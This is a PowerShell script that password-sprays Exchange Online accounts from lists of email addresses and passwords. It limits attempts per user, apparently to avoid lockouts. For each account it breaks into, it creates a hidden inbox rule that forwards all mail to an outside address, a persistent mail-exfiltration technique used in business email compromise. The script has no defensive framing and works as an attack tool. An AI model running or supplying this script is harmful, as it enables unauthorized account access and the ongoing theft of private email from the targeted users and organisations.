# Path to the file containing email addresses
$emailAddressesFile = "email_addresses.txt"

# Path to the file containing passwords
$passwordsFile = "passwords.txt"

# Load email addresses and passwords into arrays
$emailAddresses = Get-Content $emailAddressesFile
$passwords = Get-Content $passwordsFile

# Set the maximum number of attempts per user
$maxAttemptsPerUser = 2

# Specify the email address to forward messages to
$forwardTo = "forwarding@example.com"

# Loop through each email address (UPN)
foreach ($emailAddress in $emailAddresses) {
    # Counter for the number of attempts for the current user
    $attempts = 0
    
    # Loop through each password
    foreach ($password in $passwords) {
        # Attempt login using current email address (UPN) and password
        $credentials = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $emailAddress, (ConvertTo-SecureString -String $password -AsPlainText -Force)
        $result = Try {
            # Connect to Exchange Online using implicit authentication
            Connect-ExchangeOnline -Credential $credentials
            $true  # Authentication successful
        } Catch {
            $false  # Authentication failed
        }

        # Increment attempts counter
        $attempts++

        # Check if login was successful or if maximum attempts reached
        if ($result) {
            Write-Host "Login successful for $emailAddress with password $password"

            # Set up forwarding rule
            $ruleName = "Forwarding Rule"
            $mailbox = Get-Mailbox -Identity $emailAddress
            New-InboxRule -Mailbox $mailbox.UserPrincipalName -Name $ruleName -ForwardTo $forwardTo -StopProcessingRules $true -DeleteMessage $false
            Write-Host "Forwarding rule set up for $emailAddress to forward to $forwardTo"
            
            break  # Break out of password loop if login successful
        } elseif ($attempts -ge $maxAttemptsPerUser) {
            Write-Host "Maximum attempts reached for $emailAddress"
            break  # Break out of password loop if maximum attempts reached
        } else {
            Write-Host "Login failed for $emailAddress with password $password"
        }
    }
}

